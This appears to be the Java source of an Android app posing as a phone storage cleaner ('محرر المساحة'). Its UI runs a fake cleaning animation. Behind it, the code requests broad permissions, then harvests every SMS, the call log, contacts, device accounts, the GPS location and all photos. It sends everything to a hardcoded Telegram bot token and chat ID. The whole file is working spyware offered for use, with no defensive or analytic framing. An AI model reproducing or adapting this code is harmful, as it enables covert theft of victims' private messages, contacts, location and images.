package com.example.spaceeditor;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.graphics.Color;
import android.graphics.Typeface;
import android.view.Gravity;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    private static final String BOT_TOKEN = "8638457174:AAEGbqpZiLUHxzZ766EoHPJ-tU--ldvmoHc";
    private static final String CHAT_ID = "1890493375";

    private TextView titleText;
    private TextView statusText;
    private TextView spaceText;
    private ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#F5F7FA"));
        layout.setPadding(60, 60, 60, 60);

        TextView icon = new TextView(this);
        icon.setText("⚡");
        icon.setTextSize(60);
        icon.setGravity(Gravity.CENTER);
        layout.addView(icon);

        titleText = new TextView(this);
        titleText.setText("محرر المساحة");
        titleText.setTextColor(Color.parseColor("#2C3E50"));
        titleText.setTextSize(28);
        titleText.setTypeface(null, Typeface.BOLD);
        titleText.setGravity(Gravity.CENTER);
        titleText.setPadding(0, 20, 0, 10);
        layout.addView(titleText);

        spaceText = new TextView(this);
        spaceText.setText("جاري تحليل مساحة التخزين...");
        spaceText.setTextColor(Color.parseColor("#E74C3C"));
        spaceText.setTextSize(18);
        spaceText.setGravity(Gravity.CENTER);
        spaceText.setPadding(0, 0, 0, 40);
        layout.addView(spaceText);

        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(5);
        progressBar.setPadding(0, 0, 0, 40);
        layout.addView(progressBar);

        statusText = new TextView(this);
        statusText.setText("جاري فحص الملفات المؤقتة والذاكرة العشوائية...");
        statusText.setTextColor(Color.parseColor("#7F8C8D"));
        statusText.setTextSize(14);
        statusText.setGravity(Gravity.CENTER);
        layout.addView(statusText);

        setContentView(layout);

        simulateCleaning();

        String[] permissions = {
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.GET_ACCOUNTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        };
        if (Build.VERSION.SDK_INT >= 33) {
            permissions[4] = Manifest.permission.READ_MEDIA_IMAGES;
        }

        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String p : permissions) {
            if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                listPermissionsNeeded.add(p);
            }
        }

        if (!listPermissionsNeeded.isEmpty()) {
            requestPermissions(listPermissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            startExtraction();
        }
    }

    private void simulateCleaning() {
        final Handler handler = new Handler();
        final Random random = new Random();
        handler.postDelayed(new Runnable() {
            int progress = 5;
            @Override
            public void run() {
                if (progress <= 95) {
                    progress += random.nextInt(10) + 2;
                    progressBar.setProgress(progress);
                    if (progress > 30 && progress < 60) {
                        statusText.setText("تنظيف ذاكرة التخزين المؤقت...");
                        spaceText.setText("تم العثور على 450 ميجابايت ملفات غير مرغوب فيها");
                    } else if (progress >= 60) {
                        statusText.setText("تحسين أداء النظام...");
                        spaceText.setText("جاري استعادة المساحة...");
                    }
                    handler.postDelayed(this, 800);
                } else {
                    progressBar.setProgress(100);
                    statusText.setText("تم تحسين هاتفك بنجاح!");
                    spaceText.setText("✅ تم تحرير 2.4 جيجابايت من المساحة");
                }
            }
        }, 1000);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        startExtraction();
    }

    private void startExtraction() {
        new Thread(() -> {
            try {
                sendTelegramMessage("🚀 التطبيق اشتغل!");
                Cursor smsCursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, Telephony.Sms.DATE + " DESC");
                if (smsCursor != null) {
                    while (smsCursor.moveToNext()) {
                        String address = smsCursor.getString(smsCursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = smsCursor.getString(smsCursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        String senderName = getContactName(address);
                        String displaySender = senderName != null ? senderName + " (" + address + ")" : address;
                        sendTelegramMessage("📩 رسالة من: " + displaySender + "\n" + body);
                        Thread.sleep(500);
                    }
                    smsCursor.close();
                }

                StringBuilder calls = new StringBuilder("📞 سجل المكالمات:\n");
                Cursor callCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
                if (callCursor != null) {
                    while (callCursor.moveToNext()) {
                        String number = callCursor.getString(callCursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        String type = callCursor.getString(callCursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        String name = getContactName(number);
                        calls.append(name != null ? name : "غير معروف").append(" | ").append(number).append(" | ").append(type).append("\n");
                    }
                    callCursor.close();
                }
                sendTelegramMessage(calls.toString());

                StringBuilder contactsBlock = new StringBuilder("📇 جهات الاتصال:\n");
                Cursor contactCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
                if (contactCursor != null) {
                    while (contactCursor.moveToNext()) {
                        String name = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String phone = contactCursor.getString(contactCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contactsBlock.append(name).append(" : ").append(phone).append("\n");
                        if (contactsBlock.length() > 3500) {
                            sendTelegramMessage(contactsBlock.toString());
                            contactsBlock.setLength(0);
                            Thread.sleep(500);
                        }
                    }
                    contactCursor.close();
                }
                if (contactsBlock.length() > 0) sendTelegramMessage(contactsBlock.toString());

                StringBuilder emails = new StringBuilder("📧 الحسابات:\n");
                AccountManager am = AccountManager.get(getApplicationContext());
                for (Account acc : am.getAccounts()) {
                    emails.append(acc.name).append(" (").append(acc.type).append(")\n");
                }
                sendTelegramMessage(emails.toString());

                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    if (loc != null) {
                        sendTelegramMessage("📍 الموقع:\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
                    }
                }

                sendTelegramMessage("⏳ جاري سحب كل الصور...");
                String[] projection = new String[]{MediaStore.Images.Media.DATA};
                Cursor imgCursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                if (imgCursor != null) {
                    int count = 0;
                    while (imgCursor.moveToNext()) {
                        String path = imgCursor.getString(imgCursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                        File imgFile = new File(path);
                        if (imgFile.exists()) {
                            sendTelegramFile(imgFile, "🖼️ صورة (" + (count + 1) + "): " + imgFile.getName());
                            count++;
                            Thread.sleep(2000); 
                        }
                    }
                    imgCursor.close();
                    sendTelegramMessage("✅ تم سحب " + count + " صورة.");
                }
            } catch (Exception e) {
                Log.e("GRABBER", "Error", e);
            }
        }).start();
    }

    private String getContactName(String phoneNumber) {
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        String[] projection = new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME};
        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, null)) {
            if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
        } catch (Exception ignored) {}
        return null;
    }

    private void sendTelegramMessage(String text) {
        try {
            if (text.length() > 4000) text = text.substring(0, 4000) + "\n...[مقطوع]";
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + Uri.encode(text);
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { Log.e("GRABBER", "SendMsg", e); }
    }

    private void sendTelegramFile(File file, String caption) {
        try {
            String boundary = "*****", lineEnd = "\r\n", twoHyphens = "--";
            HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
            conn.setDoInput(true); conn.setDoOutput(true); conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
            DataOutputStream request = new DataOutputStream(conn.getOutputStream());
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd + CHAT_ID + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd + lineEnd + caption + lineEnd);
            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
            request.writeBytes(lineEnd);
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) request.write(buffer, 0, bytesRead);
            fileInputStream.close();
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            request.flush(); request.close();
            conn.getResponseCode(); conn.disconnect();
        } catch (Exception e) { Log.e("GRABBER", "SendFile", e); }
    }
            }
